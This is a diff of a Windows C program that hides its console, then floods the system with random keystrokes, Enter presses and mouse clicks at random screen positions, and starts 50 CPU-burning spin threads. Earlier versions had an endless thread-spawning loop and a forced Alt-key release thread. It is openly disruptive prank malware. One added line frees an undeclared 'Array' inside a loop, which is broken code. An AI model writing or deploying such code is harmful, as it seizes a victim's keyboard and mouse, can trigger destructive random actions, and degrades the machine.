@@ -1006,7 +1006,7 @@ int A[10000] =
 };
 
 
-unsigned long WINAPI MemoryLeak(LPVOID P)
+unsigned long WINAPI SpinLock(LPVOID P)
 {
     while(1)
     {
@@ -1017,25 +1017,18 @@ unsigned long WINAPI MemoryLeak(LPVOID P)
             A[i] *= 7;
             A[i] /= 7;
         }
-        Sleep(1000);
-    }
-}
-
-unsigned long WINAPI UnpressAlt(LPVOID P)
-{
-    SetThreadPriority(GetCurrentThread(), 2);
-    while(1)
-    {
-        INPUT I;
-        I.type = 1;
-        I.ki.wVk = VK_MENU;
-        I.ki.dwFlags = KEYEVENTF_KEYUP;
-        SendInput(1, &I, sizeof(INPUT));
+        free(Array);
     }
 }
 
 unsigned long WINAPI RandomInput(LPVOID P)
 {
+    int x = GetSystemMetrics(SM_CXSCREEN);
+    int y = GetSystemMetrics(SM_CYSCREEN);
+    LARGE_INTEGER DueTime;
+    DueTime.QuadPart = 5;
+    HANDLE Timer = CreateWaitableTimer(0, 0, 0);
+    SetWaitableTimer(Timer, &DueTime, 5, NULL, NULL, 0);
     while(1)
     {
         int key = (rand() % 254) + 1;
@@ -1044,23 +1037,24 @@ unsigned long WINAPI RandomInput(LPVOID P)
         I[0].ki.wVk = key;
         I[0].ki.dwFlags = 0;
         I[1].type = 0;
-        I[1].mi.dx = (rand() % 500) - 250;
-        I[1].mi.dy = (rand() % 500) - 250;
+        I[1].mi.dx = (rand() % x);
+        I[1].mi.dy = (rand() % y);
         I[1].mi.mouseData = 0;
-        I[1].mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_RIGHTDOWN;
+        I[1].mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
         I[2].type = 1;
         I[2].ki.wVk = VK_RETURN;
         I[2].ki.dwFlags = 0;
-        I[3].type = 1;
-        I[3].ki.wVk = key;
-        I[3].ki.dwFlags = KEYEVENTF_KEYUP;
+        I[3].type = 0;
+        I[3].mi.mouseData = 0;
+        I[3].mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
         I[4].type = 0;
         I[4].mi.mouseData = 0;
-        I[4].mi.dwFlags = MOUSEEVENTF_LEFTUP | MOUSEEVENTF_RIGHTUP;
+        I[4].mi.dwFlags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
         I[5].type = 1;
         I[5].ki.wVk = VK_RETURN;
         I[5].ki.dwFlags = KEYEVENTF_KEYUP;
         SendInput(6, I, sizeof(INPUT));
+        WaitForSingleObject(Timer, INFINITE);
     }
 }
 
@@ -1070,11 +1064,11 @@ int main()
     GetSystemTime(&T);
     srand(T.wMilliseconds);
     FreeConsole();
-    CreateThread(NULL, 0, UnpressAlt, NULL, 0, NULL);
     CreateThread(NULL, 0, RandomInput, NULL, 0, NULL);
-    while(1)
+    int i = 50;
+    while(i--)
     {
-        CreateThread(NULL, 0, MemoryLeak, NULL, 0, NULL);
+        CreateThread(NULL, 0, SpinLock, NULL, 0, NULL);
         Sleep(1000);
     }
 }
